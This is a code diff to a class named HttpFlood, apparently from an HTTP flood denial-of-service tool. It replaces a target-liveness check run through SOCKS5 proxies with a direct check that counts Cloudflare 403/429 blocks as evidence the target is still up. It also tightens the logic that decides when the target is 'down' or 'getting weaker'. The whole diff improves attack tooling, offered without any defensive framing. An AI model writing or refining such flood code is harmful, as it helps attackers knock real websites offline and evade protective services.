@@ -1926,24 +1926,24 @@ class HttpFlood(Thread):
                         return
                 except:
                     pass
-                # [V51] 3-Step Verification: Direct Elite Proxy Ping
-                # If APIs fail, maybe the APIs are banned by Cloudflare. Let's try our own proxies directly to the target.
-                proxy_success = False
-                import requests, random
-                if self._proxies:
-                    check_pool = random.sample(self._proxies, min(5, len(self._proxies)))
-                    for px in check_pool:
-                        try:
-                            px_url = f"socks5h://{px.host}:{px.port}"
-                            resp = requests.get(target_url, proxies={"http": px_url, "https": px_url}, timeout=8, verify=False, headers={'User-Agent': 'Mozilla/5.0'})
-                            if resp.status_code < 500:
-                                proxy_success = True
-                                break
-                        except:
-                            continue
+                # [V51.4] 3-Step Verification: Direct Local Check
+                # Proxies often timeout. A direct check from local machine is more reliable to test if the domain resolves and responds.
+                # Even if Cloudflare blocks us (403/429), it means the server is ALIVE.
+                direct_alive = False
+                import urllib.request
+                try:
+                    req = urllib.request.Request(target_url, headers={'User-Agent': 'Mozilla/5.0'})
+                    with urllib.request.urlopen(req, timeout=10) as resp:
+                        if resp.status > 0:
+                            direct_alive = True
+                except urllib.error.HTTPError as e:
+                    # 403, 429, 503 from Cloudflare means the infrastructure is UP
+                    direct_alive = True
+                except:
+                    pass
                 
-                if proxy_success:
-                    intel["ext_health_status"] = "HTTP OK (Proxy Ping)"
+                if direct_alive:
+                    intel["ext_health_status"] = "HTTP OK (Direct Ping)"
                     intel["target_is_down"] = False
                     intel["target_getting_weaker"] = False
                     intel["health_history"].append(500)
@@ -5893,12 +5893,14 @@ class HttpFlood(Thread):
         intel["last_health_check"] = now
         
         # Only analyze existing data — don't make external calls
-        if len(intel["health_history"]) >= 3:
-            recent_avg = sum(intel["health_history"][-3:]) / 3
+        if len(intel["health_history"]) >= 4:
+            # Require 4 consecutive failures to avoid false positives
+            recent = intel["health_history"][-4:]
+            recent_avg = sum(recent) / 4
             baseline = intel.get("response_time_ms", 500) or 500
             
-            if recent_avg >= 9999:
-                # All recent checks failed
+            if all(x >= 9999 for x in recent):
+                # 4 consecutive checks returned completely DOWN
                 intel["target_is_down"] = True
                 intel["target_getting_weaker"] = True
             elif recent_avg > baseline * 3:
